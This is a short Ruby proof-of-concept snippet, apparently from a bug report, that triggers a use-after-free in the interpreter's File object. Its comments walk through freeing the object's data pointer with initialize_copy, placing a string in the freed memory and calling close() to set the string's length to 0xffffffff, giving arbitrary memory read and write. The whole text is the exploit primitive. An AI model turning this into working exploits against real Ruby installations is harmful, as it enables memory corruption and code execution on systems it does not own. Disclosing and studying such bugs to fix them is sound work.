a = File.new(0)
#needs proper heap massaging for reallocation
a.initialize_copy(0) # DATA_PTR(a) is now pointing to free'd memory
#allocate string at old position
str = "foo".gsub("o","asdfasdf")
a.close() #overwrites offset 0 on DATA_PTR(a) with ffffffff
#str length is now 0xfffffffff, we can read/write arbitrary memory
